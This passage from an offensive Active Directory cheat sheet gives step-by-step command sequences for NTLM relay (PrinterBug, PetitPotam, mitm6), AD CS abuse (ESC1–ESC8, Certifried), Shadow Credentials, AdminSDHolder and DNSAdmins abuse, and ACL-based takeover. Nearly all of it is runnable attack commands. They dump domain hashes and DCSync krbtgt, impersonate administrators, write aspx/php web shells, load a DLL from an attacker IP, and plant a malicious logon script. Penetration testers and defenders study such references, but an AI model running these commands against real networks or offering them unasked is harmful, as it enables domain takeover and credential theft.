powershell TERM1> python printerbug.py testsegment.local/username@s2012exc.testsegment.local <attacker ip/hostname> TERM2> ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server. ```powershell # create a new machine account TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6 TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME connect using the ticket export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache secretsdump.py -k -no-pass second-dc-server.local -just-dc ``` Ghost Potato - CVE-2019-1384 Requirements: * User must be a member of the local Administrators group * User must be a member of the Backup Operators group * Token must be elevated Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe RemotePotato0 DCOM DCE RPC relay It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine Requirements: - a shell in session 0 (e.g. WinRm shell or SSH shell) - a privileged user is logged on in the session 1 (e.g. a Domain Admin user) # https://github.com/antonioCoco/RemotePotato0/ Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016 Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1 Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135' DNS Poisonning - Relay delegation with mitm6 Requirements: - IPv6 enabled (Windows prefers IPV6 over IPv4) - LDAP over TLS (LDAPS) ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it. git clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6 pip install . mitm6 -hw ws02 -d lab.local --ignore-nofqnd # -d: the domain name that we filter our request on (the attacked domain) # -i: the interface we have mitm6 listen on for events # -hw: host whitelist ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer # -ip: the interface you want the relay to run on # -wh: WPAD host, specifying your wpad file to serve # -t: the target where you want to relay to # now granting delegation rights and then do a RBCD ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad getST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator export KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass target.lab.local Relaying with WebDav Trick Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB Requirement : * WebClient service Exploitation : * Disable HTTP in Responder: sudo vi /usr/share/responder/Responder.conf * Generate a Windows machine name: sudo responder -I eth0 , e.g: WIN-UBNW4FI3AP0 * Prepare for RBCD against the DC: python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support * Discover WebDAV services ps1 webclientservicescanner 'domain.local'/'user':'password'@'machine' crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav GetWebDAVStatus.exe 'machine' * Trigger the authentication to relay to our nltmrelayx: PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4 , the listener host must be specified with the FQDN or full netbios name like logger.domain.local@80/test.txt . Specifying the IP results in anonymous auth instead of System. ```ps1 # PrinterBug dementor.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" SpoolSample.exe \"ATTACKER_IP\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" # PetitPotam Petitpotam.py \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" Petitpotam.py -d \"DOMAIN\" -u \"USER\" -p \"PASSWORD\" \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" PetitPotam.exe \"ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\" \"ATTACKER_IP\" * Use the created account to ask for a service ticket: ps1 .\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W' .\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt ls \\PC1.purple.lab\\c$ # IP of PC1: 10.0.0.4 ``` Active Directory Certificate Services Find ADCS Server crackmapexec ldap domain.lab -u username -p password -M adcs ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b \"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\" dNSHostName Enumerate AD Enterprise CAs with certutil: certutil.exe -config - -ping ESC1 - Misconfigured Certificate Templates Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject. Requirements: * Template that allows for AD authentication * ENROLLEE_SUPPLIES_SUBJECT flag * [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) Exploitation: * Use Certify.exe to see if there are any vulnerable templates ps1 Certify.exe find /vulnerable Certify.exe find /vulnerable /currentuser # or PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local' # or certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound * Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate) ps1 # request certificates for the machine account by executing Certify with the \"/machine\" argument from an elevated command prompt. Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local' * Use OpenSSL and convert the certificate, do not enter a password ps1 openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx * Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus ps1 Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx WARNING : These certificates will still be usable even if the user or computer resets their password! NOTE : Look for EDITF_ATTRIBUTESUBJECTALTNAME2 , CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT , ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints. ESC2 - Misconfigured Certificate Templates Requirements: * Allows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0) Exploitation: * Find template ps1 PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local' * Request a certificate specifying the /altname as a domain admin like in ESC1 . ESC3 - Misconfigured Enrollment Agent Templates ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users Request a certificate based on the vulnerable certificate template ESC3. ps1 $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3' [*] Saved certificate and private key to 'john.pfx' Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user ps1 $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx' ESC4 - Access Control Vulnerabilities Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template leading to ESC1 vulnerability Search for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate ps1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1 ```ps1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. C:>StandIn.exe --adcs --filter WebServer --ess --add * Perform ESC1 and then restore the value ps1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag ``` Using Certipy # overwrite the configuration to make it vulnerable to ESC1 certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old # request a certificate based on the ESC4 template, just like ESC1. certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local' # restore the old configuration certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name. Exploitation: * Use Certify.exe to check for UserSpecifiedSAN flag state which refers to the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. ps1 Certify.exe cas * Request a certificate for a template and add an altname, even though the default User template doesn't normally allow to specify alternative names ps1 .\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin Mitigation: * Remove the flag : certutil.exe -config \"CA01.domain.local\\CA01\" -setreg \"policy\\EditFlags\" -EDITF_ATTRIBUTESUBJECTALTNAME2 ESC7 - Vulnerable Certificate Authority Access Control Exploitation: * Detect CAs that allow low privileged users the ManageCA or Manage Certificates permissions ps1 Certify.exe find /vulnerable * Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6) ps1 Certify.exe setconfig /enablesan /restart * Request the certificate with the desired SAN. ps1 Certify.exe request /template:User /altname:super.adm * Grant approval if required or disable the approval requirement ps1 # Grant Certify.exe issue /id:[REQUEST ID] # Disable Certify.exe setconfig /removeapproval /restart Alternative exploitation from ManageCA to RCE on ADCS server: # Get the current CDP list. Useful to find remote writable shares: Certify.exe writefile /ca:SERVER\\ca-name /readonly # Write an aspx shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx # Write the default asp shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp # Write a php shell to a remote web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php ESC8 - AD CS Relay Attack An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller\u2019s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket. Require Impacket PR #1101 Version 1 : NTLM Relay + Rubeus + PetitPotam ```powershell impacket> python3 ntlmrelayx.py -t http:// /certsrv/certfnsh.asp -smb2support --adcs impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate # For a member server or workstation, the template would be \"Computer\". # Other templates: workstation, DomainController, Machine, KerberosAuthentication # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP python3 dementor.py -u -p -d python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local # Use the certificate with rubeus to request a TGT Rubeus.exe asktgt /user: /certificate: /ptt Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt # Now you can use the TGT to perform a DCSync mimikatz> lsadump::dcsync /user:krbtgt ``` Version 2 : NTLM Relay + Mimikatz + Kekeo ```powershell impacket> python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController # Mimikatz mimikatz> misc::efs /server:dc.lab.local /connect: /noauth # Kekeo kekeo> base64 /input:on kekeo> tgt::ask /pfx: /user:dc$ /domain:lab.local /ptt # Mimikatz mimikatz> lsadump::dcsync /user:krbtgt ``` Version 3 : Kerberos Relay ```ps1 # Setup the relay sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine # Run mitm6 sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v ``` Version 4 : ADCSPwn - Require WebClient service running on the domain controller. By default this service is not installed. ```powershell https://github.com/bats3c/ADCSPwn adcspwn.exe --adcs --port [local port] --remote [computer] adcspwn.exe --adcs cs.pwnlab.local adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local # ADCSPwn arguments adcs - This is the address of the AD CS server which authentication will be relayed to. secure - Use HTTPS with the certificate service. port - The port ADCSPwn will listen on. remote - Remote machine to trigger authentication from. username - Username for non-domain context. password - Password for non-domain context. dc - Domain controller to query for Certificate Templates (LDAP). unc - Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) . output - Output path to store base64 generated crt. ``` Version 5 : Certipy ESC8 ps1 certipy relay -ca 172.16.19.100 Certifried CVE-2022-26923 An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege. Find ms-DS-MachineAccountQuota ps1 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'DC=lab,DC=local' ms-DS-MachineAccountQuota Add a new computer in the Active Directory, by default MachineAccountQuota = 10 ps1 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*' certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local' [ALTERNATIVE] If you are SYSTEM and the MachineAccountQuota=0 : Use a ticket for the current machine and reset its SPN ps1 Rubeus.exe tgtdeleg export KRB5CCNAME=/tmp/ws02.ccache python bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]' Set the dNSHostName attribute to match the Domain Controller hostname ps1 python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '[\"DC.lab.local\"]' python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName Request a ticket ps1 # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA Either use the pfx or set a RBCD on your machine account to takeover the domain ```ps1 certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10 openssl pkcs12 -in dc.pfx -out dc.pem -nodes python bloodyAD.py -d lab.local -c \":dc.pem\" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$' getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*' secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 ``` Pass-The-Certificate Pass the Certificate in order to get a TGT, this technique is used in \"UnPAC the Hash\" and \"Shadow Credential\" Windows ```ps1 # Information about a cert file certutil -v -dump admin.pfx # From a Base64 PFX Rubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show # Grant DCSync rights to an user ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --sid # To restore ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --restore restoration_file.txt * Linux ps1 # Base64-encoded PFX certificate (string) (password can be set) gettgtpkinit.py -pfx-base64 $(cat \"PATH_TO_B64_PFX_CERT\") \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" \u200b # PEM certificate (file) + PEM private key (file) gettgtpkinit.py -cert-pem \"PATH_TO_PEM_CERT\" -key-pem \"PATH_TO_PEM_KEY\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" # PFX certificate (file) + password (string, optionnal) gettgtpkinit.py -cert-pfx \"PATH_TO_PFX_CERT\" -pfx-pass \"CERT_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" # Using Certipy certipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain' certipy cert -export -pfx \"PATH_TO_PFX_CERT\" -password \"CERT_PASSWORD\" -out \"unprotected.pfx\" ``` UnPAC The Hash Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate. Windows ps1 # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC. Rubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show Linux ```ps1 # Obtain a TGT by validating a PKINIT pre-authentication $ gettgtpkinit.py -cert-pfx \"PATH_TO_CERTIFICATE\" -pfx-pass \"CERTIFICATE_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\" Use the session key to recover the NT hash $ export KRB5CCNAME=\"TGT_CCACHE_FILE\" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME' ``` Shadow Credentials Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match. :warning: User objects can't edit their own msDS-KeyCredentialLink attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists Requirements : * Domain Controller on (at least) Windows Server 2016 * Domain must have Active Directory Certificate Services and Certificate Authority configured * PKINIT Kerberos authentication * An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object Exploitation : - From Windows, use Whisker : powershell # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. Whisker.exe list /target:computername$ # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. Whisker.exe add /target:\"TARGET_SAMNAME\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\" Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1] # Removes a key credential from the target object specified by a DeviceID GUID. Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b From Linux, use pyWhisker : bash # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"list\" # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\" python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"add\" --filename \"test1\" # Removes a key credential from the target object specified by a DeviceID GUID. python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"remove\" --device-id \"a8ce856e-9b58-61f9-8fd3-b079689eb46e\" Scenario : Scenario 1 : Shadow Credential relaying Trigger an NTLM authentication from DC01 (PetitPotam) Relay it to DC02 (ntlmrelayx) Edit DC01 's attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker) Alternatively : ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$' Scenario 2 : Workstation Takeover with RBCD ```ps1 # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81 # Set up ntlmrelayx to relay authentication from target workstation to DC proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81 # Execute printer bug to trigger authentication from target workstation proxychains python3 printerbug.py ez.lab/matt:Password1!@ws2.ez.lab ws1@8081/file # Get a TGT using the newly acquired certificate via PKINIT proxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR # Get a TGS for the target account proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v # Utilize the TGS for future activity export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab ``` Dangerous Built-in Groups Usage If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System or set \"dminCount attribute to 0 for the required object. The AdminCount attribute is set to 1 automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s). Find users with AdminCount=1 . crackmapexec ldap 10.10.10.10 -u username -p password --admin-count # or python ldapdomaindump.py -u example.com\\john -p pass123 -d ';' 10.10.10.10 jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json # or Get-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\" Get-ADGroup -LDAPFilter \"(objectcategory=group) (admincount=1)\" # or ([adsisearcher]\"(AdminCount=1)\").findall() AdminSDHolder Abuse The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \"protected groups\" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins. If you modify the permissions of AdminSDHolder , that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group. # Add a user to the AdminSDHolder group: Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose # Right to reset password for toto using the account titi Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword # Give all rights Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All Abusing DNS Admins Group It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM). :warning: Require privileges to restart the DNS service. Enumerate members of DNSAdmins group ps1 Get-NetGroupMember -GroupName \"DNSAdmins\" Get-ADGroupMember -Identity DNSAdmins Change dll loaded by the DNS service ```ps1 # with RSAT dnscmd /config /serverlevelplugindll \\attacker_IP\\dll\\mimilib.dll dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\\exploit\\privesc.dll with DNSServer module $dnsettings = Get-DnsServerSetting -ComputerName -Verbose -All $dnsettings.ServerLevelPluginDll = \"\\attacker_IP\\dll\\mimilib.dll\" Set-DnsServerSetting -InputObject $dnsettings -ComputerName -Verbose * Check the previous command success ps1 Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll * Restart DNS ps1 sc \\dc01 stop dns sc \\dc01 start dns ``` Abusing Active Directory ACLs/ACEs Check ACL for an User with ADACLScanner . ADACLScan.ps1 -Base \"DC=contoso;DC=com\" -Filter \"(&(AdminCount=1))\" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show GenericAll GenericAll on User : We can reset user's password without knowing the current password GenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group : On Windows : net group \"domain admins\" hacker /add /domain On Linux: using the Samba software suite : net rpc group ADDMEM \"GROUP NAME\" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP] using bloodyAD: bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME' GenericAll/GenericWrite : We can set a SPN on a target account, request a TGS, then grab its hash and kerberoast it. ```powershell # Check for interesting permissions on accounts: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"} # Check if current user has already an SPN setted: PowerView2 > Get-DomainUser -Identity | select serviceprincipalname # Force set the SPN on the account: Targeted Kerberoasting PowerView2 > Set-DomainObject -Set @{serviceprincipalname='ops/whatever1'} PowerView3 > Set-DomainObject -Identity -Set @{serviceprincipalname='any/thing'} # Grab the ticket PowerView2 > $User = Get-DomainUser username PowerView2 > $User | Get-DomainSPNTicket | fl PowerView2 > $User | Select serviceprincipalname # Remove the SPN PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname ``` GenericAll/GenericWrite : We can change a victim's userAccountControl to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back. On Windows: ```powershell Modify the userAccountControl PowerView2 > Get-DomainUser username | ConvertFrom-UACValue PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose Grab the ticket PowerView2 > Get-DomainUser username | ConvertFrom-UACValue ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username Set back the userAccountControl PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose PowerView2 > Get-DomainUser username | ConvertFrom-UACValue * On Linux: bash Modify the userAccountControl $ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user Grab the ticket $ GetNPUsers.py DOMAIN/target_user -format -outputfile Set back the userAccountControl $ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false ``` GenericWrite Reset another user's password On Windows: powershell # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1 $user = 'DOMAIN\\user1'; $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential $user, $pass; $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; Set-DomainUserPassword -Identity 'DOMAIN\\user2' -AccountPassword $newpass -Credential $creds; On Linux: ```bash # Using rpcclient from the Samba software suite rpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" Using bloodyAD with pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd ``` WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1 GenericWrite and Remote Connection Manager Now let\u2019s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called \u2018Environment\u2019. This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the \u2018Starting program\u2019 field basically function 